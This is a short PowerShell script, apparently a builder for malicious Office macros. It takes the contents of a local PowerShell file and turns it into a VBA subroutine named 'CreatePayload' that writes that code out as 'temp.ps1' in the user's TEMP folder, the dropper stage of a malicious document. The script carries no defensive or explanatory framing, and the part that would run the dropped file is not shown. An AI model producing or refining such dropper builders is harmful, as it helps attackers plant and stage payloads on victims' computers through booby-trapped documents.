$codelistBeforePrint = @(
    "Sub CreatePayload()"
    "Dim s"
    "Dim n"
    "s = Environ(`"TEMP`") + `"\temp.ps1`""
    "n = FreeFile"
    "Open s For Output As #n"
)
$codelistAfterPrint = @(
    "Close #n"
    "End Sub"
)
[string[]]$codeList = Get-Content "./main.ps1"


for ($i = 0; $i -lt $codeList.Count; $i++) {
    $codeList[$i] = ("Print #n, `"" + ($codeList[$i] -replace "`"","`"`"") + "`"")
}

$codeList = $codelistBeforePrint + $codeList + $codelistAfterPrint



echo $codeList[0]